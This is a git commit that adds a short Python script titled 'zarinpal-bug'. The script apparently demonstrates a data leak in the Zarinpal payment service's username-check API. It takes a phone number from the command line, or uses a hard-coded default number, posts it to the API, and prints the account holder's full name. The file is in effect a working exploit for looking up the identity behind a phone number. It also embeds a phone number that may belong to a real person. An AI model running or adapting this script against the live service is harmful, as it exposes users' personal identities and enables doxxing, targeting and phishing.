e8bb23fbab9dd8038b3c8646050c1536834d503b
Rayka95 <rayka.1995@gmail.com>
2017-01-04 22:01:36 +0330

    Add files via upload

---
+++ zarinpal-bug_-1122035445.py
@@ -0,0 +1,21 @@
+# -*- coding: utf-8 -*-
+"""
+Created on Fri Dec 23 13:25:26 2016
+
+@author: rayka95
+"""
+
+import requests
+import sys
+
+try:    
+    if sys.argv[1] != "":
+        number = sys.argv[1]
+    else:
+        number = "09128430978"
+    r = requests.post('https://api.zarinpal.com/rest/v3/oauth/checkUsername.json',json={"username": number})
+    name = r.json()['data']['full_name']
+    name.replace(" ","\\u0020")
+    print(name)
+except:
+    print("number doesnt seem to be correct ! :/")
